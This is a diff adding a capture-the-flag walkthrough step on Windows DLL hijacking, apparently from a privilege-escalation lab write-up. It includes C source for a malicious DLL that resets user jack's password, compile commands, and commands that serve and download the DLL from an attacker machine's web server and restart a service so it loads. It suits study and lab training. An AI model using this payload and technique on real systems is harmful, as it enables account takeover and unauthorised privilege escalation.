@@ -33,4 +33,43 @@ Right click "Foxit Reader" (Application) > Properties > Details
 
 Task 5 {DLL Hijacking}
 
+Question 1: Login with Jack's account (the new password you have set). What is the content of the flagdll.txt file? 
+{{Hint:}}
 
+Open a text editor and create a file with the following code, and name it [whatever].c:
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k net user jack Password11");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+Using the mingw compiler, generate the dll:
+x86_64-w64-mingw32-gcc whatver.c -shared -o hijackme.dll
+
+Start a webserver on your attacker machine:
+python3 -m http.server 9000
+
+On the victim PC, let's grab the malicious dll using powershell.
+First, navigate to the Temp folder:
+cd C:\Temp\
+
+Then, download the dll from our attacker machine:
+wget -O hijackme.dll [your machine IP]:9000(or the port you specified for the server)/hijackme.dll
+
+Using command prompt, restart the dllsvc service on the victim machine:
+sc stop dllsvc
+sc start dllsvc
+
+If all goes well, the password for user jack should now be changed to "Password11".
+
+Back to powershell, run the following command:
+runas /user:jack cmd.exe
+enter the password at the prompt
+
+In the new window:
+type C:\Users\jack\Documents\flagdll.txt for flag
